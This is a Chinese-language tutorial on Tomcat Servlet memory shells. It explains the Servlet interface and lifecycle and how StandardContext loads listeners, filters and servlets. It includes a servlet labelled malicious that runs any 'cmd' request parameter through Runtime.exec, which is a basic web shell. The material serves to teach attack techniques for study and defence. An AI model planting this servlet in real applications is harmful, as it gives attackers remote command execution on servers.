# Servlet创建
  我们先来看看servlet接口有什么方法
```java
public interface Servlet {  
   void init(ServletConfig var1) throws ServletException; // init方法，创建好实例后会被立即调用，仅调用一次。  
  
   ServletConfig getServletConfig();//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数  
  
   void service(ServletRequest var1, ServletResponse var2) throws ServletException, IOException;  //每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。  
  
   String getServletInfo();//返回有关servlet的信息，如作者、版本和版权.  
  
   void destroy();//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源  
}
```
`service()`应该就是我们要写的那个执行的逻辑，我们的恶意代码应该就是放在这里的。

```java
package tomcatShell.Servlet;  
  
import javax.servlet.*;  
import javax.servlet.annotation.WebServlet;  
import java.io.IOException;  
  
// 基础恶意类   
public class ServletTest implements Servlet {  
    @Override  
 public void init(ServletConfig config) throws ServletException {  
  
    }  
  
    @Override  
 public ServletConfig getServletConfig() {  
        return null;  
 }  
  
    @Override  
 public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {  
        String cmd = req.getParameter("cmd");  
 if (cmd !=null){  
            try{  
                Runtime.getRuntime().exec(cmd);  
 }catch (IOException e){  
                e.printStackTrace();  
 }catch (NullPointerException n){  
                n.printStackTrace();  
 }  
        }  
    }  
  
    @Override  
 public String getServletInfo() {  
        return null;  
 }  
  
    @Override  
 public void destroy() {  
  
    }  
}
```
配置web.xml看一眼，可以执行命令，没问题。
现在依旧还是那个问题，Servlet是怎么注册的？

Servlet的生命周期分为五部分
1. 加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建 `Servlet` 的实例
2. 初始化：当Servlet被实例化的时候，Tomcat会调用 `init()`方法初始化这个对象
3. 处理服务：当浏览器访问Servlet的时候，Servlet 会调用`service()`方法处理请求
4. 销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用`destroy()`方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁
5. 卸载：当Servlet调用完`destroy()`方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用`init()`方法进行初始化操作

之前我们分析的时候
在`org.apache.catalina.core.StandardContext`类的`startInternal()`方法中，我们能看到`**Listener->Filter->Servlet**`的加载顺序
```java
// Configure and call application event listeners  
if (ok) {  
    if (!listenerStart()) {  
        log.error(sm.getString("standardContext.listenerFail"));  
        ok = false;  
    }  
}  
  
// Check constraints for uncovered HTTP methods  
// Needs to be after SCIs and listeners as they may programmatically  
// change constraints  
if (ok) {  
    checkConstraintsForUncoveredMethods(findConstraints());  
}  
  
try {  
    // Start manager  
    Manager manager = getManager();  
    if (manager instanceof Lifecycle) {  
        ((Lifecycle) manager).start();  
    }  
} catch(Exception e) {  
    log.error(sm.getString("standardContext.managerFail"), e);  
    ok = false;  
}  
  
// Configure and call application filters  
if (ok) {  
    if (!filterStart()) {  
        log.error(sm.getString("standardContext.filterFail"));  
        ok = false;  
    }  
}  
  
// Load and initialize all "load on startup" servlets  
if (ok) {  
    if (!loadOnStartup(findChildren())){  
        log.error(sm.getString("standardContext.servletFail"));  
        ok = false;  
    }  
}  
  
// Start ContainerBackgroundProcessor thread  
super.threadStart();
}
```







































